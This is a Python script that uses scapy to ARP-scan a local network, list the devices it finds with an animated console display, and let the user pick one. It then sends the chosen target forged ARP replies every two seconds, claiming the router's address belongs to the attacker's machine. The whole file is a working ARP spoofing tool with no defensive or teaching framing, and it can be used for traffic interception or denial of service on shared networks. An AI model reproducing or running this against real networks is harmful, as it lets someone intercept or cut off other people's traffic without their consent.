import ctypes
import ipaddress
import queue
import socket
import sys
import threading
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp, conf

conf.verb = 0

IFACE        = "Ethernet"
NETWORK      = "192.168.127.0/24"
ROUTER       = "192.168.127.1"
THREAD_COUNT = 50
ANIM_DELAY   = 0.1

hosts = [str(ip) for ip in ipaddress.IPv4Network(NETWORK).hosts()]
scan_q = queue.Queue()
for ip in hosts:
    scan_q.put(ip)

discover_q = queue.Queue()
devices    = []

def worker():
    while True:
        try:
            ip = scan_q.get_nowait()
        except queue.Empty:
            return
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans = srp(pkt, iface=IFACE, timeout=1, retry=1, verbose=False)[0]
            if ans:
                mac = ans[0][1].src
                try:
                    name = socket.gethostbyaddr(ip)[0]
                except socket.herror:
                    name = ip
                discover_q.put((ip, mac, name))
        except Exception:
            pass
        finally:
            scan_q.task_done()

BASE_RED, MAX_RED = 40, 255
def color_line(text, idx, total):
    step = (MAX_RED - BASE_RED) // max(1, total - 1)
    red  = min(MAX_RED, BASE_RED + step * idx)
    return f"\033[38;2;{red};0;220m{text}\033[0m"

phrase     = "scanning for devices"
wave_fw    = [
    "".join(phrase[j].upper() if j==i else phrase[j].lower()
            for j in range(len(phrase)))
    for i in range(len(phrase))
]
dot_frames = [phrase.lower() + "."*d for d in (1,2,3)]
ANIM_FRAMES= wave_fw + dot_frames + list(reversed(wave_fw))

if not ctypes.windll.shell32.IsUserAnAdmin():
    sys.exit("[!] Please run this script as Administrator.")

threads = []
for _ in range(THREAD_COUNT):
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    threads.append(t)

print()


spinner_idx = 0
try:
    while (scan_q.unfinished_tasks > 0) or not discover_q.empty() or any(t.is_alive() for t in threads):
        while not discover_q.empty():
            ip, mac, name = discover_q.get()
            devices.append((ip, mac, name))
            idx   = len(devices) - 1
            line  = f"[{idx+1}]: {ip} -- {name} -- MAC: {mac}\n"
            print(color_line(line, idx, len(hosts)))

        active = sum(1 for t in threads if t.is_alive())
        frame  = ANIM_FRAMES[spinner_idx % len(ANIM_FRAMES)]
        spinner = f"[{active}/{THREAD_COUNT}] {frame}"
        sys.stdout.write(spinner + "\r")
        sys.stdout.flush()

        spinner_idx += 1
        time.sleep(ANIM_DELAY)

    sys.stdout.write(" " * len(spinner) + "\r")
    sys.stdout.flush()

except KeyboardInterrupt:
    sys.exit("\n[!] Aborted by user.\n")

if not devices:
    sys.exit("\n[!] No devices found. Check your NETWORK/IP range.\n")

choice = input("Select a device number to spoof: ")
try:
    sel = int(choice) - 1
    target_ip, target_mac, target_name = devices[sel]
except:
    sys.exit("[!] Invalid selection, exiting.\n")

print(f"\n[*] Spoofing {target_name} ({target_ip}) — Ctrl+C to stop\n")
our_mac = get_if_hwaddr(IFACE)

pkt = (
    Ether(src=our_mac, dst=target_mac) /
    ARP(op=2, psrc=ROUTER, pdst=target_ip, hwsrc=our_mac)
)
try:
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Stopped. ARP table will self-heal shortly.")
    sys.exit(0)
